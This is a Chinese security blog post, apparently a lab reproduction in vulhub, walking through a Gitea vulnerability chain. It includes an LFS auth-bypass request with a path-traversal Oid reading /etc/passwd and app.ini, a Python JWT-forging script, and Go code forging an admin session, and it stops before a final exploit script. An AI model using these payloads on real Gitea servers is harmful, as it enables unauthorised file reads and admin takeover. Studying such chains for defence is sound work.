@@ -1,0 +1,992 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="这是一个非常漂亮的漏洞链，很久没见过了。 我用docker来复现并学习这个漏洞，官方提供了docker镜像，vulhub也会上线这个环境。 漏洞一、 逻辑错误导致权限绕过辑中 Git LFS是Git为大文件设置的存储容器，我们可以理解为，他将真正的文件存储在git仓库外，而git仓库中只存储了这个文件的索引（一个哈希值）。这样，git objects和.git文件夹下其实是没有这个文件的，这个文件">
+<meta name="keywords" content="Web安全，移动安全，windows安全，漏洞挖掘，代码审计，智能合约">
+<meta property="og:type" content="article">
+<meta property="og:title" content="go代码审计">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/19/2019-1-19-go代码审计/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="这是一个非常漂亮的漏洞链，很久没见过了。 我用docker来复现并学习这个漏洞，官方提供了docker镜像，vulhub也会上线这个环境。 漏洞一、 逻辑错误导致权限绕过辑中 Git LFS是Git为大文件设置的存储容器，我们可以理解为，他将真正的文件存储在git仓库外，而git仓库中只存储了这个文件的索引（一个哈希值）。这样，git objects和.git文件夹下其实是没有这个文件的，这个文件">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/b665f7e0-c72f-4964-9f27-65e1a20b0c12.d64cf093932b.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/10465ffa-9923-4d3e-873d-a618f6c843d3.d71203ac5fd1.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/dcfb9bcc-9e46-4840-b93d-6f3bf3044044.17f2193eef2c.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/f2f54f18-3373-42cd-8048-de3b97c46936.b0f5a3a4aabb.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/4f263971-a882-4f6d-92f7-38c6f499d430.1e1ac71b82a6.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/adea0396-cf45-4686-802d-64afd09c8b37.21979feb0f08.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/30029c83-961b-45a7-994f-5fb09608f9cd.c26234a24496.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/e3628bed-03fe-4b47-aa9c-8c3f389c56f0.573817dfc242.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/20f7cf77-3627-4f8e-9eed-e10abc2cbe58.2ef53cd7cda7.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/e8616151-ce20-4ea1-a331-6ed660de954e.c328b0c52e0a.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/0af8f3a4-0025-48af-87e6-1703e5d3dfdc.ddc23253b10a.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/40176a75-06c9-41e5-81c3-3c6e76b689ad.690d6a4c049f.png">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.313Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="go代码审计">
+<meta name="twitter:description" content="这是一个非常漂亮的漏洞链，很久没见过了。 我用docker来复现并学习这个漏洞，官方提供了docker镜像，vulhub也会上线这个环境。 漏洞一、 逻辑错误导致权限绕过辑中 Git LFS是Git为大文件设置的存储容器，我们可以理解为，他将真正的文件存储在git仓库外，而git仓库中只存储了这个文件的索引（一个哈希值）。这样，git objects和.git文件夹下其实是没有这个文件的，这个文件">
+<meta name="twitter:image" content="https://www.leavesongs.com/media/attachment/2018/07/14/b665f7e0-c72f-4964-9f27-65e1a20b0c12.d64cf093932b.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/19/2019-1-19-go代码审计/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>go代码审计 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/19/2019-1-19-go代码审计/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">go代码审计
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-19 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-19T00:00:00+08:00">2019-01-19</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">8.2k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">7 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p>这是一个非常漂亮的漏洞链，很久没见过了。</p>
+<p>我用docker来复现并学习这个漏洞，官方提供了docker镜像，vulhub也会上线这个环境。</p>
+<h2 id="漏洞一、-逻辑错误导致权限绕过辑中"><a href="#漏洞一、-逻辑错误导致权限绕过辑中" class="headerlink" title="漏洞一、 逻辑错误导致权限绕过辑中"></a>漏洞一、 逻辑错误导致权限绕过辑中</h2><blockquote>
+<p>Git LFS是Git为大文件设置的存储容器，我们可以理解为，他将真正的文件存储在git仓库外，而git仓库中只存储了这个文件的索引（一个哈希值）。这样，git objects和.git文件夹下其实是没有这个文件的，这个文件储存在git服务器上。gitea作为一个git服务器，也提供了LFS功能。</p>
+</blockquote>
+<p>在 modules/lfs/server.go 文件中，PostHandler是POST请求的处理函数：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2018/07/14/b665f7e0-c72f-4964-9f27-65e1a20b0c12.png" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2018/07/14/b665f7e0-c72f-4964-9f27-65e1a20b0c12.d64cf093932b.png" alt="carbon_2 (1).png"></a></p>
+<p>可见，其中间部分包含对权限的检查：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if !authenticate(ctx, repository, rv.Authorization, true) &#123;</span><br><span class="line">    requireAuth(ctx)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在没有权限的情况下，仅执行了requireAuth函数：这个函数做了两件事，一是写入WWW-Authenticate头，二是设置状态码为401。也就是说，在没有权限的情况下，并没有停止执行PostHandler函数。</p>
+<p>所以，这里存在一处权限绕过漏洞。</p>
+<h2 id="漏洞二、目录穿越漏洞"><a href="#漏洞二、目录穿越漏洞" class="headerlink" title="漏洞二、目录穿越漏洞"></a>漏洞二、目录穿越漏洞</h2><p>这个权限绕过漏洞导致的后果是，未授权的任意用户都可以为某个项目（后面都以vulhub/repo为例）创建一个Git LFS对象。</p>
+<p>这个LFS对象可以通过<code>http://example.com/vulhub/repo.git/info/lfs/objects/[oid]</code>这样的接口来访问，比如下载、写入内容等。其中<code>[oid]</code>是LFS对象的ID，通常来说是一个哈希，但gitea中并没有限制这个ID允许包含的字符，这也是导致第二个漏洞的根本原因。</p>
+<p>我们利用第一个漏洞，先发送一个数据包，创建一个Oid为<code>....../../../etc/passwd</code>的LFS对象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /vulhub/repo.git/info/lfs/objects HTTP/1.1</span><br><span class="line">Host: your-ip:3000</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: application/vnd.git-lfs+json</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 151</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Oid&quot;: &quot;....../../../etc/passwd&quot;,</span><br><span class="line">    &quot;Size&quot;: 1000000,</span><br><span class="line">    &quot;User&quot; : &quot;a&quot;,</span><br><span class="line">    &quot;Password&quot; : &quot;a&quot;,</span><br><span class="line">    &quot;Repo&quot; : &quot;a&quot;,</span><br><span class="line">    &quot;Authorization&quot; : &quot;a&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中，vulhub/repo是一个公开的项目。</p>
+<blockquote>
+<p>也就是说，这个漏洞的利用是有条件的，第一个条件就是需要有一个公开项目。为什么呢？虽然“创建LFS对象”接口有权限绕过漏洞，但是“读取这个对象所代表的文件”接口没有漏洞，会先检查你是否有权限访问这个LFS对象所在的项目。只有公开项目才有权限读取。</p>
+</blockquote>
+<p>见下图，发送数据包后，虽然返回了401状态码，但实际上这个LFS对象已经创建成功，且其Oid为<code>....../../../etc/passwd</code>。</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2018/07/14/10465ffa-9923-4d3e-873d-a618f6c843d3.png" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2018/07/14/10465ffa-9923-4d3e-873d-a618f6c843d3.d71203ac5fd1.png" alt="57c643e3-d955-4965-93d8-1b1d58ad4e37.png"></a></p>
+<p>第二步，就是访问这个对象。访问方法就是GET请求<code>http://example.com/vulhub/repo.git/info/lfs/objects/[oid]/sth</code>，oid就是刚才指定的，这里要用url编码一下。</p>
+<p>见下图，/etc/passwd已被成功读取：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2018/07/14/dcfb9bcc-9e46-4840-b93d-6f3bf3044044.png" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2018/07/14/dcfb9bcc-9e46-4840-b93d-6f3bf3044044.17f2193eef2c.png" alt="37c58888-8ed3-463e-8653-3671c5894fc7.png"></a></p>
+<p>那么，我们来看看为什么读取到了/etc/passwd文件。</p>
+<p>代码 modules/lfs/content_store.go ：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2018/07/14/f2f54f18-3373-42cd-8048-de3b97c46936.png" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2018/07/14/f2f54f18-3373-42cd-8048-de3b97c46936.b0f5a3a4aabb.png" alt="carbon_3.png"></a></p>
+<p>可见，<code>meta.Oid</code>被传入transformKey函数，这个函数里，将Oid转换成了<code>key[0:2]/key[2:4]/key[4:]</code>这样的形式，前两个、中间两个字符做为目录名，第四个字符以后的内容作为文件名。</p>
+<p>那么，我创建的Oid为<code>....../../../etc/passwd</code>，在经过transformKey函数后就变成了<code>../../../../../etc/passwd</code>，<code>s.BasePath</code>是LFS对象的基础目录，二者拼接后自然就读取到了/etc/passwd文件。</p>
+<p>这就是第二个漏洞：目录穿越。</p>
+<h2 id="漏洞三、读取配置文件，构造JWT密文"><a href="#漏洞三、读取配置文件，构造JWT密文" class="headerlink" title="漏洞三、读取配置文件，构造JWT密文"></a>漏洞三、读取配置文件，构造JWT密文</h2><p>vulhub/repo虽然是一个公开项目，但默认只有读权限。我们需要进一步利用。</p>
+<p>我们利用目录穿越漏洞，可以读取到gitea的配置文件。这个文件在<code>$GITEA_CUSTOM/conf/app.ini</code>，<code>$GITEA_CUSTOM</code>是gitea的根目录，默认是<code>/var/lib/gitea/</code>，在vulhub里是<code>/data/gitea</code>。</p>
+<p>所以，要从LFS的目录跨越到<code>$GITEA_CUSTOM/conf/app.ini</code>，需要构造出的Oid是<code>....gitea/conf/app.ini</code>（经过转换后就变成了<code>/data/gitea/lfs/../../gitea/conf/app.ini</code>，也就是<code>/data/gitea/conf/app.ini</code>。原漏洞作者给出的POC这一块是有坑的，这个Oid需要根据不同<code>$GITEA_CUSTOM</code>的设置进行调整。）</p>
+<p>成功读取到配置文件（仍需先发送POST包创建Oid为<code>....gitea/conf/app.ini</code>的LFS对象）：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2018/07/14/4f263971-a882-4f6d-92f7-38c6f499d430.png" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2018/07/14/4f263971-a882-4f6d-92f7-38c6f499d430.1e1ac71b82a6.png" alt="f1674ff8-6e32-4cb1-ad93-ebe61fc810d6.png"></a></p>
+<p>配置文件中有很多敏感信息，如数据库账号密码、一些Token等。如果是sqlite数据库，我们甚至能直接下载之。当然，密码加了salt。</p>
+<p>Gitea中，LFS的接口是使用JWT认证，其加密密钥就是配置文件中的<code>LFS_JWT_SECRET</code>。所以，这里我们就可以用来构造JWT认证，进而获取LFS完整的读写权限。</p>
+<p>我们用python来生成密文：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_base64</span><span class="params">(data)</span>:</span></span><br><span class="line">    missing_padding = len(data) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> missing_padding != <span class="number">0</span>:</span><br><span class="line">        data += <span class="string">'='</span>* (<span class="number">4</span> - missing_padding)</span><br><span class="line">    <span class="keyword">return</span> base64.urlsafe_b64decode(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jwt_secret = decode_base64(<span class="string">'oUsPAAkeic6HaBMHPiTVHxTeCrEDc29sL6f0JuVp73c'</span>)</span><br><span class="line">public_user_id = <span class="number">1</span></span><br><span class="line">public_repo_id = <span class="number">1</span></span><br><span class="line">nbf = int(time.time())-(<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">1000</span>)</span><br><span class="line">exp = int(time.time())+(<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">token = jwt.encode(&#123;<span class="string">'user'</span>: public_user_id, <span class="string">'repo'</span>: public_repo_id, <span class="string">'op'</span>: <span class="string">'upload'</span>, <span class="string">'exp'</span>: exp, <span class="string">'nbf'</span>: nbf&#125;, jwt_secret, algorithm=<span class="string">'HS256'</span>)</span><br><span class="line">token = token.decode()</span><br><span class="line"></span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>jwt_secret</code>是第二个漏洞中读取到的密钥；<code>public_user_id</code>是项目所有者的id，<code>public_repo_id</code>是项目id，这个项目指LFS所在的项目；<code>nbf</code>是指这个密文的开始时间，<code>exp</code>是这个密文的结束时间，只有当前时间处于这两个值中时，这个密文才有效。</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2018/07/14/adea0396-cf45-4686-802d-64afd09c8b37.png" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2018/07/14/adea0396-cf45-4686-802d-64afd09c8b37.21979feb0f08.png" alt="f5d88f3c-f91d-426b-a9a7-0249f7674c1d.png"></a></p>
+<h2 id="漏洞四、利用条件竞争，写入任意文件"><a href="#漏洞四、利用条件竞争，写入任意文件" class="headerlink" title="漏洞四、利用条件竞争，写入任意文件"></a>漏洞四、利用条件竞争，写入任意文件</h2><p>现在，我们能构造JWT的密文，即可访问LFS中的写入文件接口，也就是PutHandler。</p>
+<p>PUT操作主要是如下代码：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2018/07/14/30029c83-961b-45a7-994f-5fb09608f9cd.png" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2018/07/14/30029c83-961b-45a7-994f-5fb09608f9cd.c26234a24496.png" alt="carbon_4.png"></a></p>
+<p>整个过程整理如下：</p>
+<ol>
+<li><code>transformKey(meta.Oid)</code> + .tmp 后缀作为临时文件名</li>
+<li>如果目录不存在，则创建目录</li>
+<li>将用户传入的内容写入临时文件</li>
+<li>如果文件大小和<code>meta.Size</code>不一致，则返回错误（<code>meta.size</code>是第一步中创建LFS时传入的Size参数）</li>
+<li>如果文件哈希和<code>meta.Oid</code>不一致，则返回错误</li>
+<li>将临时文件重命名为真正的文件名</li>
+</ol>
+<p>因为我们需要写入任意文件，所以Oid一定是能够穿越到其他目录的一个恶意字符串，而一个文件的哈希（sha256）却只是一个HEX字符串。所以上面的第5步，一定会失败导致退出，所以不可能执行到第6步。也就是说，我们只能写入一个后缀是“.tmp”的临时文件。</p>
+<p>另外，作者用到了<code>defer os.Remove(tmpPath)</code>这个语法。在go语言中，defer代表函数返回时执行的操作，也就是说，不管函数是否返回错误，结束时都会删除临时文件。</p>
+<p>所以，我们需要解决的是两个问题：</p>
+<ol>
+<li>能够写入一个.tmp为后缀的文件，怎么利用？</li>
+<li>如何让这个文件在利用成功之前不被删除？</li>
+</ol>
+<p>我们先思考第二个问题。漏洞发现者给出的方法是，利用条件竞争。</p>
+<p>因为gitea中是用流式方法来读取数据包，并将读取到的内容写入临时文件，那么我们可以用流式HTTP方法，传入我们需要写入的文件内容，然后挂起HTTP连接。这时候，后端会一直等待我传剩下的字符，在这个时间差内，Put函数是等待在<code>io.Copy</code>那个步骤的，当然也就不会删除临时文件了。</p>
+<p>那么，思考第一个问题，.tmp为后缀的临时文件，我们能做什么？</p>
+<h2 id="漏洞五、伪造session提升权限"><a href="#漏洞五、伪造session提升权限" class="headerlink" title="漏洞五、伪造session提升权限"></a>漏洞五、伪造session提升权限</h2><p>最简单的，我们可以向/etc/cron.d/中写入一个crontab配置文件，然后反弹获取shell。但通常gitea不会运行在root权限，所以我们需要思考其他方法。</p>
+<p>gitea使用<a href="https://github.com/go-macaron/session" target="_blank" rel="noopener">go-macaron/session</a>这个第三方模块来管理session，默认使用文件作为session存储容器。我们来阅读<a href="https://github.com/go-macaron/session/blob/master/file.go" target="_blank" rel="noopener">go-macaron/session源码</a>：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2018/07/14/e3628bed-03fe-4b47-aa9c-8c3f389c56f0.png" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2018/07/14/e3628bed-03fe-4b47-aa9c-8c3f389c56f0.573817dfc242.png" alt="carbon_7.png"></a></p>
+<p>这里面有几个很重要的点：</p>
+<ol>
+<li>session文件名为<code>sid[0]/sid[1]/sid</code></li>
+<li>对象被用Gob序列化后存入文件</li>
+</ol>
+<p>Gob是Go语言独有的序列化方法。我们可以编写一段Go语言程序，来生成一段Gob编码的session：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;encoding/gob&quot;</span><br><span class="line">    &quot;bytes&quot;</span><br><span class="line">    &quot;encoding/hex&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func EncodeGob(obj map[interface&#123;&#125;]interface&#123;&#125;) ([]byte, error) &#123;</span><br><span class="line">    for _, v := range obj &#123;</span><br><span class="line">        gob.Register(v)</span><br><span class="line">    &#125;</span><br><span class="line">    buf := bytes.NewBuffer(nil)</span><br><span class="line">    err := gob.NewEncoder(buf).Encode(obj)</span><br><span class="line">    return buf.Bytes(), err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    var uid int64 = 1</span><br><span class="line">    obj := map[interface&#123;&#125;]interface&#123;&#125; &#123;&quot;_old_uid&quot;: &quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;vulhub&quot; &#125;</span><br><span class="line">    data, err := EncodeGob(obj)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    edata := hex.EncodeToString(data)</span><br><span class="line">    fmt.Println(edata)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>{&quot;_old_iod&quot;: &quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;vulhub&quot; }</code>就是session中的数据，uid是管理员id，uname是管理员用户名。编译并执行上述代码，得到一串hex，就是伪造的数据。</p>
+<blockquote>
+<p>原作者给出的POC是他生成好的一段二进制文件，uid和uname不能自定义。</p>
+</blockquote>
+<p><a href="https://www.leavesongs.com/media/attachment/2018/07/14/20f7cf77-3627-4f8e-9eed-e10abc2cbe58.png" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2018/07/14/20f7cf77-3627-4f8e-9eed-e10abc2cbe58.2ef53cd7cda7.png" alt="c2d8c85f-f2e1-4413-8f24-d0e6a834de6f.png"></a></p>
+<p>接着，我写了一个简单的Python脚本来进行后续利用（需要Python3.6）：</p>
